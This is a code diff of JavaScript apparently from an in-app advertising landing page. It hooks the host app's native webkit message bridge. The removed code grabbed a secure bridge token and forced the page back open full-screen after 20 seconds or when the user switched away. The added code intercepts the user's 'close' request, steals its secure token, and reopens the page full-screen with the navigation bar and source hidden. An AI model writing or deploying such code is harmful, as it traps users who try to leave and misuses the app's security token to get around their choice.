@@ -195,34 +195,18 @@ function startTimer(){
   var wk=window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
   if(!wk)return;
 
-  var token=null,schemeFired=false;
+  var fired=false;
+  var orig=wk.postMessage.bind(wk);
 
-  // Get secure token via getConfig callback
-  var cbId='__ttcb_gc';
-  window[cbId]=function(result){
-    try{
-      var r=typeof result==='string'?JSON.parse(result):result;
-      var tok=r&&r.secure&&r.secure.token;
-      if(tok&&!token)token=tok;
-    }catch(e){}
+  wk.postMessage=function(msg){
+    if(!fired&&msg&&msg.func==='close'&&msg.params&&msg.params._jsb_secure_token){
+      fired=true;
+      var fsUrl=SELF_URL+'?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+      try{orig({func:'openAdLandPageLinks',params:{url:fsUrl,landingStyle:2,isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN,_jsb_secure_token:msg.params._jsb_secure_token}});}catch(e){}
+      return;
+    }
+    return orig(msg);
   };
-  try{wk.postMessage({func:'getConfig',params:{},callbackId:cbId});}catch(e){}
-
-  function fireFullscreen(){
-    if(schemeFired)return;schemeFired=true;
-    var fsUrl=SELF_URL+'?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
-    var params={url:fsUrl,landingStyle:2,isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN};
-    if(token)params._jsb_secure_token=token;
-    try{wk.postMessage({func:'openAdLandPageLinks',params:params});}catch(e){}
-  }
-
-  // Proactive: fire after 20s while page is guaranteed alive
-  setTimeout(fireFullscreen,20000);
-
-  // Exit detection: fire immediately if user leaves before 20s
-  document.addEventListener('visibilitychange',function(){if(document.hidden)fireFullscreen();else schemeFired=false;});
-  window.addEventListener('pagehide',fireFullscreen);
-  window.addEventListener('blur',fireFullscreen);
 })();
 
 function handleClaim(){
